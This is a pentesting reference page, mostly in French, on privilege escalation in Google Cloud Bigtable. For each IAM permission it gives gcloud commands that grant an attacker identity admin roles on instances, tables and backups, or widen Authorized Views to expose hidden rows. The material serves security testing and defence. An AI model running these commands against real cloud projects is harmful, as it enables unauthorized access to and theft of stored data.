# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Pour plus d'informations sur Bigtable, consultez :

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Autorisations :** `bigtable.instances.setIamPolicy` (et généralement `bigtable.instances.getIamPolicy` pour lire les bindings actuels).

Posséder la politique IAM de l'instance vous permet de vous attribuer **`roles/bigtable.admin`** (ou tout rôle personnalisé), ce qui se répercute sur chaque cluster, table, sauvegarde et vue autorisée de l'instance.

<details><summary>S'attribuer le rôle bigtable.admin sur l'instance</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> Si vous ne pouvez pas lister les bindings existants, créez un nouveau document de policy et appliquez-le avec `gcloud bigtable instances set-iam-policy`, en veillant à y conserver votre propre accès.

Après avoir obtenu cette permission, consultez la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) pour d'autres techniques d'abus des permissions Bigtable.

### `bigtable.tables.setIamPolicy`

**Permissions:** `bigtable.tables.setIamPolicy` (optionally `bigtable.tables.getIamPolicy`).

Instance policies can be locked down while individual tables are delegated. If you can edit the table IAM you can **promote yourself to owner of the target dataset** without touching other workloads.

<details><summary>Attribuez-vous le rôle bigtable.admin sur la table</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Après avoir obtenu cette permission, consultez la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) pour plus de techniques permettant d'abuser des permissions Bigtable.


### `bigtable.backups.setIamPolicy`

**Permissions:** `bigtable.backups.setIamPolicy`

Les sauvegardes peuvent être restaurées sur **n'importe quelle instance dans n'importe quel projet** que vous contrôlez. D'abord, donnez à votre identité l'accès à la sauvegarde, puis restaurez-la dans un sandbox où vous avez des rôles Admin/Owner.

Si vous avez la permission `bigtable.backups.setIamPolicy`, vous pouvez vous accorder la permission `bigtable.backups.restore` pour restaurer d'anciennes sauvegardes et tenter d'accéder à des informations sensibles.

<details><summary>Prendre possession d'un instantané de sauvegarde</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Après avoir vérifié cette permission dans la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) pour savoir comment restaurer une sauvegarde.


### Mettre à jour Authorized View

**Autorisations:** `bigtable.authorizedViews.update`

Les Authorized Views sont censées masquer des lignes/colonnes. Les modifier ou les supprimer **supprime les garde-fous granulaires** sur lesquels s'appuient les défenseurs.

<details><summary>Mettre à jour Authorized View pour élargir l'accès</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

Après avoir obtenu cette permission, consultez la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) pour savoir comment lire depuis une Authorized View.

### `bigtable.authorizedViews.setIamPolicy`

**Permissions :**  `bigtable.authorizedViews.setIamPolicy`.

Un attaquant disposant de cette permission peut s'octroyer l'accès à une Authorized View, qui peut contenir des données sensibles auxquelles il n'aurait pas autrement accès.

<details><summary>S'octroyer l'accès à Authorized View</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

Après avoir effectué cette vérification de permission, consultez la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) pour savoir comment lire depuis une vue autorisée.

{{#include ../../../banners/hacktricks-training.md}}
